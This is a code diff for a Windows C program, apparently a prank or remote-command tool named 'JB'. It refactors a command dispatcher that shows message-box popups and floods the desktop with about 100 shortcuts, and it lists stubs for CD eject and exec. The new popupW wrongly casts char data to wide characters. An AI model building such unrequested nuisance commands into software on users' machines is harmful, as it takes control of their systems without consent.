@@ -34,13 +34,46 @@ static char wallpaper[MAX_PATH] = BADPATH;
 
 // TODO: JBlog these to files instead of console
 void JBlog(const char* message) {
-    printf("%li - JBlog: \"%s\"\n", time(NULL), message);
+    printf("%lli - JBlog: \"%s\"\n", time(NULL), message);
 }
 
 void JBlogErr(const char *message) {
-    printf("%li - ERROR: \"%s\"\n", time(NULL), message);
+    printf("%lli - ERROR: \"%s\"\n", time(NULL), message);
 }
 
+
+void popupW(char *argz) {
+    wchar_t *arg1 = wcstok((wchar_t *)argz, SEPL);
+    if(!arg1) {
+        JBlogErr("Not enough arguments");
+        return;
+    }
+
+    wchar_t *arg2 = wcstok(NULL, SEPL);
+    MessageBoxW(NULL, arg1, arg2 ? arg2 : L"JB", 0);
+}
+
+void popupA(char *argz) {
+    char *arg1 = strtok(argz, SEP);
+    if(!arg1) {
+        JBlogErr("Not enough arguments");
+        return;
+    }
+    char *arg2 = strtok(NULL, SEP);
+
+    MessageBoxA(NULL, arg1, arg2 ? arg2 : "JB", 0);
+}
+
+void CreateLinksSubr(char *argz) {
+    char *arg1 = strtok(argz, SEP);
+        if(!arg1) {
+            JBlogErr("Not enough arguments");
+            return;
+        }
+        char *arg2 = strtok(NULL, SEP);
+
+        CreateLinks(arg1, arg2 ? atoi(arg2) : 100);
+}
 
 void execCommand(JBCMD cmd)
 {
@@ -91,21 +124,10 @@ void execCommand(JBCMD cmd)
 
     /* --- Shortcuts --- */
     case JB_CREATELINKS:
-        char *arg1 = strtok(cmd.args, SEP);
-        if(!arg1) {
-            JBlogErr("Not enougth arguments");
-            break;
-        }
-
-        char *arg2 = strtok(NULL, SEP);
-        if(!arg2)
-            arg2 = "100"; // default 100 icons
-
-        CreateLinks(arg1, atoi(arg2));
-
+        CreateLinksSubr(cmd.args);
         break;
     case JB_REMOVELINKS:
-
+        //ResolveLinks();
         break;
 
     /* --- Other --- */
@@ -115,44 +137,11 @@ void execCommand(JBCMD cmd)
     case JB_CDEJECT:
 
         break;
-    
-    /*
-    case JB_POPUPW:
-        //wchar_t wideBuffer[CMD_ARGSZ * 2];
-        //MultiByteToWideChar(CP_ACP, MB_COMPOSITE, cmd.args, CMD_ARGSZ, wideBuffer, CMD_ARGSZ * 2)
-        char *arg1 = strtok(cmd.args, SEP);
-        if(!arg1) {
-            JBlogErr("Not enought arguments");
-            break;
-        }
-
-        int len = MultiByteToWideChar(CP_ACP, 0, arg1, -1, NULL, 0);
-
-        wchar_t *msg = malloc(sizeof(len));
-        MultiByteToWideChar(CP_ACP, MB_COMPOSITE, arg1, -1, msg, len);
-
-        char *arg2 = strtok(NULL, SEP);
-
-        if(!arg2)
-            wTitle = L"JB";
-
-        MessageBoxW(NULL, msg, wTitle, 0);
-
-        free(msg);
-        break;
-    */
     case JB_POPUPA:
-        char *arg1 = strtok(cmd.args, SEP);
-        if(!arg1) {
-            JBlogErr("Not enougth arguments");
-            break;
-        }
-
-        char *arg2 = strtok(NULL, SEP);
-        if(!arg2)
-            arg2 = "JB"; // default message title
-
-        MessageBoxA(NULL, arg1, arg2, 0);
+        popupA(cmd.args);
+        break;
+    case JB_POPUPW:
+        popupW(cmd.args);
         break;
     case JB_EXEC:
 
@@ -169,6 +158,7 @@ void execCommand(JBCMD cmd)
 
     default:
         JBlogErr("Unknown command");
+        printf("cmd=%u\n", cmd.cmd);
         break;
     }
 }
